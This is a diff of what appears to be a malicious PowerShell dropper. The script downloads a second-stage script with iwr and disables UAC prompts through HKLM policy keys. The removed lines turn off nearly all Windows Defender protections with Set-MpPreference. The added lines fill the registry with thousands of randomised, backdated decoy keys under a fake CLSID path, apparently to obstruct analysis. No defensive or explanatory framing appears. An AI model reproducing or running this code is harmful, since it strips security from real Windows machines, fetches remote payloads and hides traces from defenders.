@@ -24,46 +24,45 @@ $paths = @(
 )
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
+$g = "{$([guid]::NewGuid().ToString().ToUpper())}"
+$basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
+New-Item -Path $basePath -Force
+New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+$ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
+$p = Get-Random -Count 5 -In (1..5000)
+$score = Get-Random -Minimum 1634 -Maximum 4766
 $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
 
-Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
-Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
-Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
-Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
-Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableCpuThrottleOnIdleScans $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableDatagramProcessing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableDnsOverTcpParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableDnsParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableGradualRelease $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableHttpParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableInboundConnectionFiltering $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRdpParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRemovableDriveScanning $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRestorePoint $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScanningNetworkFiles $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableSshParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableTlsParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableFtpParing $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableNetworkProtectionPerfTelemetry $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableSmtpParsing $true -ErrorAction SilentlyContinue
-Set-MpPreference -LowThreatDefaultAction NoAction -ErrorAction SilentlyContinue
-Set-MpPreference -ModerateThreatDefaultAction NoAction -ErrorAction SilentlyContinue
-Set-MpPreference -HighThreatDefaultAction NoAction -ErrorAction SilentlyContinue
+
+
+
+
+1..5000 | ForEach-Object {
+    $curr = $_
+    if($p.Contains($curr)){
+        $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
+        New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date -Format "yyyyMMdd") -Force
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
+    }
+    if($curr -eq $score){   New-Item -Path "$basePath\yXureYzQpIRLN" -Force | Out-Null  }
+
+
+    $subName = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
+    New-Item -Path "$basePath\$subName" -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
+}
+
+
+
+
+
+
+
+
 Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Type DWord -Value 0 -Force
 Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name ConsentPromptBehaviorAdmin -Type DWord -Value 0 -Force
 Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name PromptOnSecureDesktop -Type DWord -Value 0 -Force
